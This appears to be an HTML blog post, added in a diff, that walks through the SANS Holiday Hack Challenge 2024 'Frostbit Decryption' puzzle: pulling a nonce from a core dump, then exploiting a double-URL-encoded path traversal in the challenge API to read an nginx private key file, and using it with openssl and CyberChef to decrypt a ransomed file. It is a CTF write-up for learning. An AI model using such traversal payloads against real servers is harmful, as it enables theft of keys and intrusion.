@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+  <title>
+  HHC24 - Frostbit Decryption · Journey into IT Knowledge
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="ArmBraker 👨‍💻">
+<meta name="description" content="Analyze of ransomware, looking for decryption key to restore of encrypted file">
+<meta name="keywords" content="blog,knowledge,IT Security,hacking,personal,networking">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HHC24 - Frostbit Decryption">
+  <meta name="twitter:description" content="Analyze of ransomware, looking for decryption key to restore of encrypted file">
+
+<meta property="og:url" content="http://localhost:1313/blog/posts/hhc24/frostbitdecrypt/">
+  <meta property="og:site_name" content="Journey into IT Knowledge">
+  <meta property="og:title" content="HHC24 - Frostbit Decryption">
+  <meta property="og:description" content="Analyze of ransomware, looking for decryption key to restore of encrypted file">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-26T14:59:25+01:00">
+    <meta property="article:modified_time" content="2025-01-26T14:59:25+01:00">
+    <meta property="article:tag" content="HHC24">
+    <meta property="article:tag" content="Sans">
+    <meta property="article:tag" content="CTF">
+      <meta property="og:see_also" content="http://localhost:1313/blog/posts/hhc24/frostbitdeactivation/">
+      <meta property="og:see_also" content="http://localhost:1313/blog/posts/hhc24/elfstack/">
+      <meta property="og:see_also" content="http://localhost:1313/blog/posts/hhc24/santavision/">
+      <meta property="og:see_also" content="http://localhost:1313/blog/posts/hhc24/dronmagedon/">
+      <meta property="og:see_also" content="http://localhost:1313/blog/posts/hhc24/powershell/">
+      <meta property="og:see_also" content="http://localhost:1313/blog/posts/hhc24/snowball-showdown/">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/blog/posts/hhc24/frostbitdecrypt/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/blog/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/blog/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/blog/">
+      Journey into IT Knowledge
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/">Home</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/blog/posts/hhc24/frostbitdecrypt/">
+              HHC24 - Frostbit Decryption
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-01-26T14:59:25&#43;01:00">
+                January 26, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              2-minute read
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/blog/categories/ransomware/">Ransomware</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/decryption/">Decryption</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/dfir/">DFIR</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/web-app-hacking/">Web-App Hacking</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/python/">Python</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/rsa/">RSA</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/blog/tags/hhc24/">HHC24</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/blog/tags/sans/">Sans</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/blog/tags/ctf/">CTF</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h2 id="introduction">
+  Introduction
+  <a class="heading-link" href="#introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<blockquote>
+<p>Hardest challenge of HHC24! This was challenge require series of multiple detective and attack techniques. Lot&rsquo;s of folks loose thier sanity during this road 🛣.</p>
+</blockquote>
+<ul>
+<li>There is no Silver 🥈 or Gold 🥇 variant. You will receive a silver medal when finishing the challange and gold when you solve Deativation challange.</li>
+</ul>
+<h2 id="decrypt-pcap">
+  Decrypt PCAP
+  <a class="heading-link" href="#decrypt-pcap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Look for session key log file in dump:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings frostbit_core_dump.13 | grep <span style="color:#5af78e">&#34;secret&#34;</span> -i
+</span></span></code></pre></div><ul>
+<li>Other way to obtain the nonce can be:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings frostbit_core_dump.13 | grep <span style="color:#5af78e">&#34;session&#34;</span> -i
+</span></span></code></pre></div><p><a href="https://api.frostbit.app/api/v1/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/session#"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/api/v1/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/session#</a></p>
+<ul>
+<li>Our nonce is:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;nonce&#34;</span>: <span style="color:#5af78e">&#34;e6b27a8c416c8f03&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="web-exploit">
+  Web Exploit
+  <a class="heading-link" href="#web-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>working URL:</li>
+</ul>
+<p><a href="https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=a08500d12558c120ca00081224024840"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=a08500d12558c120ca00081224024840</a></p>
+<ul>
+<li>URL with enabled debug:</li>
+</ul>
+<p><a href="https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=a08500d12558c120ca00081224024840&amp;debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=a08500d12558c120ca00081224024840&debug=true</a></p>
+<ul>
+<li>Error page after modifing URI:
+<a href="https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=83270120-3b1c-41f3-b25b-deaa5b5d1327&amp;debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=83270120-3b1c-41f3-b25b-deaa5b5d1327&debug=true</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \&#34;/app/frostbit/ransomware/static/FrostBiteHashlib.py\&#34;, line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Non-hexadecimal digit found\n&#34;
+</span></span></code></pre></div><ul>
+<li>LFI indicating error:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>   <span style="color:#ff6ac1">&#34;debug&#34;</span>: <span style="color:#ff6ac1">true</span>,
+</span></span><span style="display:flex;"><span>   <span style="color:#ff6ac1">&#34;error&#34;</span>: <span style="color:#5af78e">&#34;Status Id File Not Found&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Legend to LFI errors:</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;invalid digest&#34; = You have the right file path and file-name but you need to add padding character
+</span></span><span style="display:flex;"><span>&#34;file not found&#34; = You have the wrong file name or file path
+</span></span></code></pre></div><ul>
+<li>I experimented with the web application to discover a possibility to get LFI vulnerability. I used a know file and it&rsquo;s location to abuse the proxy rewrite, so I double enoded the path to the known file:
+<ul>
+<li>known file: <code>frostbit.png</code></li>
+<li>known file location: <code>/static/frostbit.png</code></li>
+<li>desired path: for python backend: <code>../static/frostbit.png</code></li>
+<li>double URL encoded path: <code>..%252Fstatic%252Ffrostbit.png</code> &lt;- to Abuse the Proxy URL decode</li>
+<li>Payload: <a href="https://api.frostbit.app/view/..%252Fstatic%252Ffrostbit.png/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=e6b27a8c416c8f03e6b27a8c416c8f03e6b27a&amp;debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/..%252Fstatic%252Ffrostbit.png/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=e6b27a8c416c8f03e6b27a8c416c8f03e6b27a&debug=true</a></li>
+<li>Error:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;debug&#34;</span>: <span style="color:#ff6ac1">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&#34;error&#34;</span>: <span style="color:#5af78e">&#34;Invalid Status Id or Digest&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>
+<p>Template for payload:
+<a href="https://api.frostbit.app/view/%7bpadding%7d%7bnonce%7d%7bnonce%7d/../%7bfilepath%7d/%7bUUID%7d/status?digest=00000000000000000000000000000000&amp;debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/{padding}{nonce}{nonce}/../{filepath}/{UUID}/status?digest=00000000000000000000000000000000&debug=true</a></p>
+</li>
+<li>
+<p><strong>Note:</strong> the <code>/</code> bewteen <code>{nonce}/../{filepath}</code> need to be URL encoded as well!</p>
+</li>
+<li>
+<p><strong>Working payload:</strong>
+<a href="https://api.frostbit.app/view/aaaa%25e6%25b2%257a%258c%2541%256c%258f%2503%25e6%25b2%257a%258c%2541%256c%258f%2503%252F..%252F..%252Fstatic%252Ffrostbit.png/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=00000000000000000000000000000000&amp;debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/aaaa%25e6%25b2%257a%258c%2541%256c%258f%2503%25e6%25b2%257a%258c%2541%256c%258f%2503%252F..%252F..%252Fstatic%252Ffrostbit.png/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=00000000000000000000000000000000&debug=true</a></p>
+</li>
+<li>
+<p>Payload for <code>.key</code> file:</p>
+</li>
+</ul>
+<p><a href="https://api.frostbit.app/view/%25e6%25b2%257a%258c%2541%256c%258f%2503%25e6%25b2%257a%258c%2541%256c%258f%2503%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=00000000000000000000000000000000&amp;debug=true"  class="external-link" target="_blank" rel="noopener">https://api.frostbit.app/view/%25e6%25b2%257a%258c%2541%256c%258f%2503%25e6%25b2%257a%258c%2541%256c%258f%2503%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=00000000000000000000000000000000&debug=true</a></p>
+<h3 id="decypher-naughty-list">
+  Decypher naughty list
+  <a class="heading-link" href="#decypher-naughty-list">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Decryption the <code>encryptedkey</code> from memory dump with collected .pem file:</li>
+</ul>
+<ol>
+<li>
+<p>First convert the string (from memorry dump) into binary data using <code>xxd</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    <span style="color:#ff5c57">echo</span> -n <span style="color:#5af78e">&#34;8303aa5aaf930e50c46bc90a8b1fafd75f13424544cf3b64fe607fe5c56587c4a4576bdf07dd13efef23a17383500a7d73dc62a5e65a5c78612b42cfd5e002731c6b6d38a3c50ffc1675aa20474c688fa41238f3720be5f198f7f8ee8a31463f7baaee344e6d70446ec17385b842b4a55c6c8b60fb8d81904927fd8741476591675602f3019aa47079c124f2ce11c43f6aa2800f99b0c716868caf185e762d0819024f75b61f6930ede582929ac34eb5d9b3ba860ff40521c8189772ee0be4dd5e9af43b99aef62cf7bcfce8f59b8850d9f9494ac05a97159ecbee585a4f40e532bc22be448921d83bd22a0f7bf1dccec632d4cc6c332346bf4ed06b00a71ca84bab99fe9eab9e866246ff7634d70da21092e351135c26246859998c5f044c2802a93f3a627532ba783fd0dd3455ff570b703852f367925db4bae73feeea25279f4f31bf31d549c00c00514919aa871746c8be0976d8b700b912fb1148ec34d08efae008ac423383e86b68750297bf1e2bec81cf81b35fdb992be27295faa0a58ca70985a4155280ef0e4c63efb8285fb4b8ef02a5eb439f42cbfa0546df780e4654207839cb7d36ac5ef821b750284150f4a96fe3d6399f4b4a62ad07dacf06a5b94cf6a7220b03815a74f7a6160b413c6508dd731f8cc28748b7709315fcb2f6d101cb5ecf7ddc7c3b2033148f08ea69cdd7da0ef9567ad39e0d7613c40f00&#34;</span> | xxd -r -p &gt; encryptedkey.bin
+</span></span></code></pre></div></li>
+<li>
+<p>Decrypt the generated <code>.bin</code> file with key <code>.pem</code> obtained from the web application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkeyutl -decrypt -inkey rsakey.pem -in encryptedkey.bin -out decryptedkey.key
+</span></span></code></pre></div></li>
+<li>
+<p>decryption key is:
+<code>53bf2366675de4b10d60fe6c02c24f98,e6b27a8c416c8f03</code></p>
+</li>
+</ol>
+<ul>
+<li>
+<p>Now, we can decrypt the <code>.csv</code>, I used  CyberChef with following recipe:</p>
+<ul>
+<li>RSA -&gt; key UTF8, IV UTF8, Mode CBC, INPUT/Output RAW:
+<a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt%28%7B%27option%27:%27UTF8%27,%27string%27:%2753bf2366675de4b10d60fe6c02c24f98%27%7D,%7B%27option%27:%27UTF8%27,%27string%27:%27e6b27a8c416c8f03%27%7D,%27CBC%27,%27Raw%27,%27Raw%27,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D%29"  class="external-link" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'53bf2366675de4b10d60fe6c02c24f98'%7D,%7B'option':'UTF8','string':'e6b27a8c416c8f03'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)</a></li>
+</ul>
+</li>
+<li>
+<p>File is not decrypted and we can look for child&rsquo; name.</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li>Answer for this challange is: <strong>Xena Xtreme</strong> 🥈</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="see-also-in-hhc24">
+        See also in HHC24
+        <a class="heading-link" href="#see-also-in-hhc24">
+          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+          <span class="sr-only">Link to heading</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/frostbitdeactivation/">HHC24 - Frostbit Deactivation</a>
+            </li>
+          
+        
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/elfstack/">HHC24 - ElfStack</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/santavision/">HHC24 - SantaVision</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/dronmagedon/">HHC24 - Dronmagedon</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/powershell/">HHC24 - Powershell</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     ArmBraker 👨‍💻 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/blog/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
